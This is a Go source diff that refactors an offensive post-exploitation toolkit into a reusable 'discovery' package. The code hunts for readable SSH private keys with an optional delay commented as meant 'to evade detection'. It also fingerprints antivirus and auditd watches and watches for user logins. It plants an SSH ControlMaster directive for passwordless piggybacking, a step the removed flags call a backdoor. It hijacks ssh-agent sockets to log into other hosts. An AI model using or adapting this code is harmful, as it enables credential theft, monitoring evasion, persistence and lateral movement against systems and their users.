@@ -1,10 +1,8 @@
-package main
+package discovery
 
 import (
 	"bufio"
 	"bytes"
-	"encoding/json"
-	"flag"
 	"fmt"
 	"io/ioutil"
 	"net"
@@ -14,7 +12,6 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
-	"sync"
 	"syscall"
 	"time"
 
@@ -27,37 +24,13 @@ import (
 	"golang.org/x/crypto/ssh/agent"
 )
 
-// CLI flags
-var (
-	// Passive recon
-	flag_gatt       = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
-	flag_pkeys      = flag.Bool("pkeys", false, "Detect private keys")
-	flag_pkey_dirs  = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
-	flag_pkey_sleep = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
-	flag_av         = flag.Bool("av", false, "Check for signs of A/V services running or present.")
-	flag_container  = flag.Bool("container", false, "Detect if this system is running in a container. [UNRELIABLE]")
-	flag_net        = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
-	flag_watches    = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
-	flag_arp        = flag.Bool("arp", false, "Grab ARP table for all devices.")
-	flag_who        = flag.Bool("who", false, "List who's logged in and from where.")
-	// Passive recon over time
-	flag_poll_net    = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
-	flag_poll_users  = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
-	flag_stalk_luser = flag.String("stalk-luser", "", "Wait until a user logs in locally and log it. Use \"*\" to match any user.")
-
-	// Active - backdoor
-	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
-	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Undo --ssh-cm. If the config file is empty after the undo, it will be removed.")
-	// Active - lateral movement
-	flag_stalk_ruser     = flag.String("stalk-ruser", "", "Wait until a user logs in locally and attempt to also log into that host.")
-	flag_stalk_ruser_cmd = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host after successful login.")
-)
-
 var (
 	// Antivirus systems we detect
 	AVSystems = []AVDiscoverer{
-		OSSECAV{name: "OSSEC"},
-		SophosAV{name: "Sophos"},
+		OSSECAV{},
+		SophosAV{},
+		TripwireAV{},
+		SamhainAV{},
 	}
 	// The typical location where auditd looks for its ruleset
 	AuditdRules = "/etc/audit/audit.rules"
@@ -71,15 +44,10 @@ var (
 )
 
 // string parameter is the user who logged into this system.
-type localLoginStalkAction func(string, netConn) error
+type LocalLoginStalkAction func(string, NetConn) error
 
 // string parameter is the user who logged into a remote system.
-type remoteLoginStalkAction func(string) map[string][]sshLoginSuccess
-
-type sshPrivateKey struct {
-	Path      string
-	Encrypted bool
-}
+type RemoteLoginStalkAction func(string) map[string][]sshLoginSuccess
 
 const (
 	L4ProtoTcp = iota
@@ -101,23 +69,45 @@ type FilePerm struct {
 	uid, gid uint32
 }
 
+type Host struct {
+	Ip    string
+	Port  int64
+	Proto NetProto
+}
+type NetConn struct {
+	Dst, Src Host
+	Pid      int // process ID of this network connection, if applicable.
+	Proto    NetProto
+}
+
 type NetProto struct {
 	l3, l4 int
 }
 
-type Host struct {
-	ip    string
-	port  int64
-	proto NetProto
-}
-type netConn struct {
-	dst, src Host
-	pid      int // process ID of this network connection, if applicable.
-	proto    NetProto
+// LoadedKernelModule houses information regarding a kernel module that is currently loaded
+type LoadedKernelModule struct {
+	address string
+	size    int
+	name    string
 }
 
-// watch holds the information for which the system is attempting to detect access.
-type watch struct {
+type Output struct {
+	Name   string
+	Values []interface{}
+}
+
+type Process struct {
+	pid  int
+	name string
+}
+
+type SshPrivateKey struct {
+	Path      string
+	Encrypted bool
+}
+
+// Watch holds the information for which the system is attempting to detect access.
+type Watch struct {
 	// Path being watched.
 	Path string
 	// Action the watch is looking for, i.e. read/write/execute. For example "wa" would detect file writes or appendages.
@@ -133,117 +123,29 @@ type Who struct {
 	Time int32
 }
 
-type Output struct {
-	Name   string
-	Values []interface{}
-}
-
-type process struct {
-	pid  int
-	name string
-}
-type loadedKernelModule struct {
-	address string
-	size    int
-	name    string
-}
-
-type Av struct {
-	Paths         []string
-	Procs         []process
-	KernelModules []loadedKernelModule
-	Name          string
-}
-
-type OSSECAV struct {
-	AVDiscoverer
-	name string
-}
-
-type SophosAV struct {
-	AVDiscoverer
-	name string
-}
-
-// Each AV system implements this interface to expose artifacts of the detected system.
-type AVDiscoverer interface {
-	// Filesystem paths of binaries
-	Paths() []string
-	// Running processes
-	Procs() []process
-	// Loaded kernel modules
-	KernelModules() []loadedKernelModule
-	// Name of the AV system
-	Name() string
-}
-
-func (o OSSECAV) Paths() []string {
-	return existingPaths([]string{
-		"/var/ossec",
-	})
-}
-
-func (o OSSECAV) Procs() []process {
-	return runningProcs([]string{
-		"ossec-agentd",
-		"ossec-syscheckd",
-	})
-}
-
-// KernelModules returns an empty list as OSSEC doesn't use kernel modules.
-func (o OSSECAV) KernelModules() []loadedKernelModule {
-	return []loadedKernelModule{}
-}
-
-func (o OSSECAV) Name() string {
-	return o.name
-}
-
-func (s SophosAV) Paths() []string {
-	return existingPaths([]string{
-		"/etc/init.d/sav-protect",
-		"/etc/init.d/sav-rms",
-		"/lib/systemd/system/sav-protect.service",
-		"/lib/systemd/system/sav-rms.service",
-		"/opt/sophos-av",
-	})
-}
-
-func (s SophosAV) Procs() []process {
-	return runningProcs([]string{
-		"savd",
-		"savscand",
-	})
-}
-
-func (o SophosAV) KernelModules() []loadedKernelModule {
-	return []loadedKernelModule{}
-}
-
-func (o SophosAV) Name() string {
-	return o.name
-}
-
 // existingPaths returns a subset of paths that exist on the filesystem.
 func existingPaths(paths []string) []string {
 	found := []string{}
 	for _, path := range paths {
-		if _, err := os.Stat(path); err == nil {
-			found = append(found, path)
+		//if _, err := os.Stat(path); err == nil {
+		if matches, err := filepath.Glob(path); err == nil {
+			for _, m := range matches {
+				found = append(found, m)
+			}
 		}
 	}
 	return found
 }
 
 // runningProcs returns a subset of processes that are currently running.
-func runningProcs(procs []string) []process {
+func runningProcs(procs []string) []Process {
 	allProcs, _ := ps.Processes()
-	found := []process{}
+	found := []Process{}
 	for _, aproc := range allProcs {
 		procName := aproc.Executable()
 		for _, need := range procs {
 			if need == procName {
-				found = append(found, process{
+				found = append(found, Process{
 					pid:  aproc.Pid(),
 					name: procName,
 				})
@@ -255,29 +157,29 @@ func runningProcs(procs []string) []process {
 
 // establishConns grabs currently established network connections
 // and looks for the connection characteristics in "needle".
-func establishedConnections(conns []netConn, needle netConn) []netConn {
-	found := []netConn{}
+func establishedConnections(conns []NetConn, needle NetConn) []NetConn {
+	found := []NetConn{}
 
 	for _, nc := range conns {
-		if needle.src.ip != "" && needle.src.ip != nc.src.ip {
+		if needle.Src.Ip != "" && needle.Src.Ip != nc.Src.Ip {
 			continue
 		}
-		if needle.dst.ip != "" && needle.dst.ip != nc.dst.ip {
+		if needle.Dst.Ip != "" && needle.Dst.Ip != nc.Dst.Ip {
 			continue
 		}
-		if needle.src.port != 0 && needle.src.port != nc.src.port {
+		if needle.Src.Port != 0 && needle.Src.Port != nc.Src.Port {
 			continue
 		}
-		if needle.dst.port != 0 && needle.dst.port != nc.dst.port {
+		if needle.Dst.Port != 0 && needle.Dst.Port != nc.Dst.Port {
 			continue
 		}
-		if needle.proto.l3 != 0 && needle.proto.l3 != nc.proto.l3 {
+		if needle.Proto.l3 != 0 && needle.Proto.l3 != nc.Proto.l3 {
 			continue
 		}
-		if needle.proto.l4 != 0 && needle.proto.l4 != nc.proto.l4 {
+		if needle.Proto.l4 != 0 && needle.Proto.l4 != nc.Proto.l4 {
 			continue
 		}
-		if needle.pid != 0 && needle.pid != nc.pid {
+		if needle.Pid != 0 && needle.Pid != nc.Pid {
 			continue
 		}
 		found = append(found, nc)
@@ -286,9 +188,9 @@ func establishedConnections(conns []netConn, needle netConn) []netConn {
 	return found
 }
 
-// getPrivateKey extracts a sshPrivateKey object from a string if a key exists.
-func getPrivateKey(path string) sshPrivateKey {
-	p := sshPrivateKey{}
+// getPrivateKey extracts a SshPrivateKey object from a string if a key exists.
+func getPrivateKey(path string) SshPrivateKey {
+	p := SshPrivateKey{}
 	f, err := os.Open(path)
 	// If we don't have permission to open the file, skip it.
 	if err != nil {
@@ -309,18 +211,18 @@ func getPrivateKey(path string) sshPrivateKey {
 	if err != nil {
 		return p
 	}
-	p = sshPrivateKey{
+	p = SshPrivateKey{
 		Path:      path,
 		Encrypted: strings.HasSuffix(line, "ENCRYPTED\n"),
 	}
 	return p
 }
 
-// getSSHKeys looks for readable ssh private keys. Optionally sleep for `sleep`
+// GetSSHKeys looks for readable ssh private keys. Optionally sleep for `sleep`
 // milliseconds to evade detection.
-func getSSHKeys(dirs string, sleep int) []sshPrivateKey {
-	pkeys := []sshPrivateKey{}
-	for _, dir := range strings.Split(*flag_pkey_dirs, ",") {
+func GetSSHKeys(dirs string, sleep int) []SshPrivateKey {
+	pkeys := []SshPrivateKey{}
+	for _, dir := range strings.Split(dirs, ",") {
 		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
 			if sleep != 0 {
 				time.Sleep(time.Duration(sleep) * time.Millisecond)
@@ -329,7 +231,7 @@ func getSSHKeys(dirs string, sleep int) []sshPrivateKey {
 				return nil
 			}
 			pkey := getPrivateKey(path)
-			if pkey != (sshPrivateKey{}) {
+			if pkey != (SshPrivateKey{}) {
 				pkeys = append(pkeys, pkey)
 			}
 			return nil
@@ -338,9 +240,9 @@ func getSSHKeys(dirs string, sleep int) []sshPrivateKey {
 	return pkeys
 }
 
-// isContainer looks at init's cgroup and total process count to guess at
+// IsContainer looks at init's cgroup and total process count to guess at
 // whether we're in a container. These are basically informed *guesses*.
-func isContainer() bool {
+func IsContainer() bool {
 	procs, err := ps.Processes()
 	if err != nil {
 		return false
@@ -365,8 +267,8 @@ func isContainer() bool {
 	return false
 }
 
-// getArp fetches the current arp table, the map between known MACs and their IPs
-func getArp() []netlink.Neigh {
+// GetArp fetches the current arp table, the map between known MACs and their IPs
+func GetArp() []netlink.Neigh {
 	neighs, err := netlink.NeighList(0, 0)
 	if err != nil {
 		return []netlink.Neigh{}
@@ -376,7 +278,7 @@ func getArp() []netlink.Neigh {
 }
 
 func isUserLoggedIn(user string) bool {
-	for _, w := range getWho() {
+	for _, w := range GetWho() {
 		if w.User == user || user == "*" {
 			return true
 		}
@@ -384,8 +286,8 @@ func isUserLoggedIn(user string) bool {
 	return false
 }
 
-// getWho fetches information about currently logged-in users.
-func getWho() []Who {
+// GetWho fetches information about currently logged-in users.
+func GetWho() []Who {
 	found := []Who{}
 	utmps, err := utmp.ReadUtmp(UtmpPath, utmp.LoginProcess)
 	if err != nil {
@@ -403,18 +305,18 @@ func getWho() []Who {
 	return found
 }
 
-// getWatches fetches a list of watches that auditd currently has on filesystem paths.
-func getWatches() ([]watch, error) {
+// GetAuditWatches fetches a list of watches that auditd currently has on filesystem paths.
+func GetAuditWatches() ([]Watch, error) {
 	re := regexp.MustCompile("-w ([^[:space:]]+).* -p ([[:alpha:]]+)")
 	t, err := ioutil.ReadFile(AuditdRules)
-	found := []watch{}
+	found := []Watch{}
 	if err != nil {
 		return nil, fmt.Errorf("Unable to open %v", AuditdRules)
 	}
 	for _, line := range strings.Split(string(t), "\n") {
 		matches := re.FindStringSubmatch(line)
 		if len(matches) == 3 {
-			found = append(found, watch{
+			found = append(found, Watch{
 				Path:   matches[1],
 				Action: matches[2],
 			})
@@ -432,32 +334,32 @@ func stringToIntOrZero(s string) int {
 }
 
 // getNetworkConnections returns all established tcp/udp ipv4/ipv6 network connections.
-func getNetworkConnections() []netConn {
-	found := []netConn{}
+func getNetworkConnections() []NetConn {
+	found := []NetConn{}
 
 	for _, conn := range netstat.Tcp() {
 		if conn.State == "ESTABLISHED" {
-			found = append(found, netConn{
-				src: Host{
-					ip:   conn.Ip,
-					port: conn.Port,
+			found = append(found, NetConn{
+				Src: Host{
+					Ip:   conn.Ip,
+					Port: conn.Port,
 				},
-				dst: Host{
-					ip:   conn.ForeignIp,
-					port: conn.ForeignPort,
+				Dst: Host{
+					Ip:   conn.ForeignIp,
+					Port: conn.ForeignPort,
 				},
-				proto: NetProto{
+				Proto: NetProto{
 					l3: L3ProtoIpv4,
 					l4: L4ProtoTcp,
 				},
-				pid: stringToIntOrZero(conn.Pid),
+				Pid: stringToIntOrZero(conn.Pid),
 			})
 		}
 	}
 	/*
 		for _, conn := range netstat.Udp() {
 			if conn.State == "ESTABLISHED" {
-				found = append(found, netConn{
+				found = append(found, NetConn{
 					srcIp:   conn.Ip,
 					dstIp:   conn.ForeignIp,
 					srcPort: conn.Port,
@@ -470,7 +372,7 @@ func getNetworkConnections() []netConn {
 		}
 		for _, conn := range netstat.Tcp6() {
 			if conn.State == "ESTABLISHED" {
-				found = append(found, netConn{
+				found = append(found, NetConn{
 					srcIp:   conn.Ip,
 					dstIp:   conn.ForeignIp,
 					srcPort: conn.Port,
@@ -483,7 +385,7 @@ func getNetworkConnections() []netConn {
 		}
 		for _, conn := range netstat.Udp6() {
 			if conn.State == "ESTABLISHED" {
-				found = append(found, netConn{
+				found = append(found, NetConn{
 					srcIp:   conn.Ip,
 					dstIp:   conn.ForeignIp,
 					srcPort: conn.Port,
@@ -581,7 +483,7 @@ func sshLoginWithAgent(user string, host Host) (string, error) {
 	*/
 	for user, userPaths := range sockPaths {
 		for _, path := range userPaths {
-			fmt.Printf("Attempting remote login via %s as %s to %s:%d\n", path, user, host.ip, host.port)
+			fmt.Printf("Attempting remote login via %s as %s to %s:%d\n", path, user, host.Ip, host.Port)
 			sock, err := net.Dial("unix", path)
 			if err != nil {
 				fmt.Printf("Can't open socket: %s\n", path)
@@ -606,13 +508,13 @@ func sshLoginWithAgent(user string, host Host) (string, error) {
 
 			// If the destination address is ipv6, wrap it in brackets, otherwise leave it bare.
 			var hostStr = ""
-			if host.proto.l3 == L3ProtoIpv4 {
-				hostStr = host.ip
+			if host.Proto.l3 == L3ProtoIpv4 {
+				hostStr = host.Ip
 			} else {
-				hostStr = fmt.Sprintf("[%s]", host.ip)
+				hostStr = fmt.Sprintf("[%s]", host.Ip)
 			}
 			fmt.Println("here1")
-			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.port), config)
+			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.Port), config)
 			if err != nil {
 				fmt.Printf("Failed to dial: %v", err)
 				continue
@@ -695,9 +597,9 @@ func sshKnownHosts() []Host {
 					}
 				}
 				found = append(found, Host{
-					ip:   host,
-					port: port,
-					proto: NetProto{
+					Ip:   host,
+					Port: port,
+					Proto: NetProto{
 						l3: l3Proto,
 						l4: L4ProtoTcp,
 					},
@@ -718,15 +620,15 @@ func sshKnownHosts() []Host {
 func getCandidateRHosts() []Host {
 	//conns := getNetworkConnections()
 	found := []Host{}
-	conns := []netConn{}
-	conns = establishedConnections(conns, netConn{
-		dst:   Host{port: 22},
-		proto: NetProto{l4: L4ProtoTcp},
+	conns := []NetConn{}
+	conns = establishedConnections(conns, NetConn{
+		Dst:   Host{Port: 22},
+		Proto: NetProto{l4: L4ProtoTcp},
 	})
 	for _, conn := range conns {
 		found = append(found, Host{
-			ip:    conn.dst.ip,
-			proto: conn.dst.proto,
+			Ip:    conn.Dst.Ip,
+			Proto: conn.Dst.Proto,
 		})
 	}
 	return append(found, sshKnownHosts()...)
@@ -759,10 +661,10 @@ func isSSHControlMasterActive(user string) bool {
 	return false
 }
 
-// setSSHControlMaster places a ControlMaster directive in the user's ssh config file.
+// SetSSHControlMaster places a ControlMaster directive in the user's ssh config file.
 // bool return value is true if the config file is created, false if it already exists.
 // If err != nil, bool return value can't be trusted.
-func setSSHControlMaster(user string) (bool, error) {
+func SetSSHControlMaster(user string) (bool, error) {
 	var origTime = time.Now()
 	var created = false
 	filename, err := getSSHConfigFilename(user)
@@ -775,7 +677,7 @@ func setSSHControlMaster(user string) (bool, error) {
 		return created, err
 	}
 	// Either create the config file or append to it
-	// TODO: if the file is created, then unsetSSHControlMaster() should remove it.
+	// TODO: if the file is created, then UnsetSSHControlMaster() should remove it.
 	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 	if err != nil {
 		return created, err
@@ -791,8 +693,8 @@ func setSSHControlMaster(user string) (bool, error) {
 	return created, nil
 }
 
-// unsetSSHControlMaster removes the ControlMaster directive from user's ssh config file
-func unsetSSHControlMaster(user string) error {
+// UnsetSSHControlMaster removes the ControlMaster directive from user's ssh config file
+func UnsetSSHControlMaster(user string) error {
 	var origTime = time.Now()
 	filename, err := getSSHConfigFilename(user)
 	if err != nil {
@@ -871,18 +773,18 @@ func unsetSSHControlMaster(user string) error {
 	return nil
 }
 
-// stalkLocalLogin performs an action when a specific user logs in at any point in the future.
+// StalkLocalLogin performs an action when a specific user logs in at any point in the future.
 // If user == "*", any user will trigger the action.
-func stalkLocalLogin(user string, action localLoginStalkAction) error {
+func StalkLocalLogin(user string, action LocalLoginStalkAction) error {
 	start := time.Now()
 	ticker := time.NewTicker(10 * time.Second)
 	for {
 		select {
 		case <-ticker.C:
-			for _, w := range getWho() {
+			for _, w := range GetWho() {
 				if (user == "*" || user == w.User) && start.Before(time.Unix(int64(w.Time), 0)) {
-					action(w.User, netConn{
-						src: Host{ip: w.Host},
+					action(w.User, NetConn{
+						Src: Host{Ip: w.Host},
 					})
 					start = time.Now()
 				}
@@ -892,10 +794,10 @@ func stalkLocalLogin(user string, action localLoginStalkAction) error {
 	return nil
 }
 
-// stalkRemoteLogin attempts to log into a remote system via two methods:
+// StalkRemoteLogin attempts to log into a remote system via two methods:
 // 1. If the presence of an ssh-agent is detected, attempt to use it to log into the same host.
 // 2. [not implemented] If the Control Master socket is recently created, attempt to use it
-func stalkRemoteLogin(user string, action remoteLoginStalkAction) error {
+func StalkRemoteLogin(user string, action RemoteLoginStalkAction) error {
 	/*
 			ticker := time.NewTicker(1 * time.Minute)
 			for {
@@ -913,11 +815,11 @@ func stalkRemoteLogin(user string, action remoteLoginStalkAction) error {
 	return nil
 }
 
-// attemptRemoteLogin will wait for signs that a user that can be hijacked is logged in.
+// AttemptRemoteLogin will wait for signs that a user that can be hijacked is logged in.
 // This means either a user with an ssh-agent running or with a ControlMaster socket active.
-func attemptRemoteLogin(user string) map[string][]sshLoginSuccess {
+func AttemptRemoteLogin(user string) map[string][]sshLoginSuccess {
 	hosts := getCandidateRHosts()
-	loggedIn := getWho()
+	loggedIn := GetWho()
 	found := map[string][]sshLoginSuccess{}
 	fmt.Println(loggedIn)
 	for _, host := range hosts {
@@ -940,179 +842,18 @@ func attemptRemoteLogin(user string) map[string][]sshLoginSuccess {
 	return found
 }
 
-func getAVs() []Av {
+func GetAV() []Av {
 	avs := []Av{}
 	for _, av := range AVSystems {
-		avs = append(avs, Av{
-			Name:          av.Name(),
-			Paths:         av.Paths(),
-			Procs:         av.Procs(),
-			KernelModules: av.KernelModules(),
-		})
-	}
-	return avs
-}
-
-func prettyString(i interface{}) string {
-	p, err := json.MarshalIndent(i, "", "  ")
-	ret := ""
-	if err == nil {
-		ret = string(p)
-	} else {
-		ret = fmt.Sprintf("Error:", err.Error())
-	}
-	return ret
-}
-
-func main() {
-	flag.Parse()
-	output := []Output{}
-
-	if *flag_gatt || *flag_container {
-		fmt.Printf("isContainer: %v\n", isContainer())
-	}
-	if *flag_gatt || *flag_pkeys {
-		fmt.Printf("ssh keys:")
-		keys := getSSHKeys(*flag_pkey_dirs, *flag_pkey_sleep)
-		var values []interface{} = make([]interface{}, len(keys))
-		for i := range keys {
-			values[i] = keys[i]
-		}
-		output = append(output, Output{
-			Name:   "SSH Keys",
-			Values: values,
-		})
-	}
-	if *flag_gatt || *flag_av {
-		avs := getAVs()
-		var values []interface{} = make([]interface{}, len(avs))
-		for i := range avs {
-			values[i] = avs[i]
-		}
-		output = append(output, Output{
-			Name:   "Antivirus",
-			Values: values,
-		})
-	}
-	if *flag_gatt || *flag_net {
-		conns := []netstat.Process{}
-		wg := sync.WaitGroup{}
-		l := sync.Mutex{}
-
-		wg.Add(1)
-		go func() {
-			tcp4 := netstat.Tcp()
-			l.Lock()
-			for _, conn := range tcp4 {
-				if conn.State == "ESTABLISHED" {
-					conns = append(conns, conn)
-				}
-			}
-			l.Unlock()
-			wg.Done()
-		}()
-
-		wg.Add(1)
-		go func() {
-			udp4 := netstat.Udp()
-			l.Lock()
-			for _, conn := range udp4 {
-				if conn.State == "ESTABLISHED" {
-					conns = append(conns, conn)
-				}
-			}
-			l.Unlock()
-			wg.Done()
-		}()
-
-		wg.Add(1)
-		go func() {
-			tcp6 := netstat.Tcp6()
-			l.Lock()
-			for _, conn := range tcp6 {
-				if conn.State == "ESTABLISHED" {
-					conns = append(conns, conn)
-				}
-			}
-			l.Unlock()
-			wg.Done()
-		}()
-
-		wg.Add(1)
-		go func() {
-			udp6 := netstat.Udp6()
-			l.Lock()
-			for _, conn := range udp6 {
-				if conn.State == "ESTABLISHED" {
-					conns = append(conns, conn)
-				}
-			}
-			l.Unlock()
-			wg.Done()
-		}()
-
-		wg.Wait()
-
-		var values []interface{} = make([]interface{}, len(conns))
-		for i := range conns {
-			values[i] = conns[i]
-		}
-		output = append(output, Output{
-			Name:   "Network connections",
-			Values: values,
-		})
-	}
-	if *flag_gatt || *flag_watches {
-		watches, err := getWatches()
-		var values []interface{} = make([]interface{}, len(watches))
-		if err != nil {
-			fmt.Println("Error checking watches: ", err)
-		} else {
-			for i := range watches {
-				values[i] = watches[i]
-			}
-			output = append(output, Output{
-				Name:   "auditd watches",
-				Values: values,
+		name, paths, procs, kms := av.Name(), av.Paths(), av.Procs(), av.KernelModules()
+		if len(paths) != 0 || len(procs) != 0 || len(kms) != 0 {
+			avs = append(avs, Av{
+				Name:          name,
+				Paths:         paths,
+				Procs:         procs,
+				KernelModules: kms,
 			})
 		}
 	}
-	if *flag_gatt || *flag_arp {
-		arp := getArp()
-		var values []interface{} = make([]interface{}, len(arp))
-		for i := range arp {
-			values[i] = arp[i]
-		}
-		output = append(output, Output{
-			Name:   "ARP",
-			Values: values,
-		})
-	}
-	if *flag_gatt || *flag_who {
-		who := getWho()
-		var values []interface{} = make([]interface{}, len(who))
-		for i := range who {
-			values[i] = who[i]
-		}
-		output = append(output, Output{
-			Name:   "Who",
-			Values: values,
-		})
-	}
-	if *flag_stalk_luser != "" {
-		stalkLocalLogin(*flag_stalk_luser, func(user string, conn netConn) error {
-			fmt.Printf("User logged in %v: %s@%s\n", time.Now(), user, conn.src.ip)
-			return nil
-		})
-	}
-	if *flag_stalk_ruser != "" {
-		stalkRemoteLogin(*flag_stalk_ruser, attemptRemoteLogin)
-	}
-	if *flag_ssh_cm != "" {
-		setSSHControlMaster(*flag_ssh_cm)
-	}
-	if *flag_rm_ssh_cm != "" {
-		unsetSSHControlMaster(*flag_rm_ssh_cm)
-	}
-	fmt.Println(prettyString(output))
+	return avs
 }
